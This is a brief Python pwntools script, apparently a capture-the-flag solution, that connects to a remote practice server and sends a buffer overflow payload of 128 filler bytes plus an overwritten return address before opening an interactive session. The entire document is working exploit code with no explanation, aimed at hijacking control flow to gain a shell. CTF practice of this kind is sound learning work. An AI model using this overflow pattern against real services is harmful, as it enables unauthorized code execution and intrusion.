from pwn import *

p=remote("ctf.j0n9hyun.xyz",3001)

payload='a' * 128 + '\x9b\x84\x04\x08'

p.sendline(payload)
p.interactive()
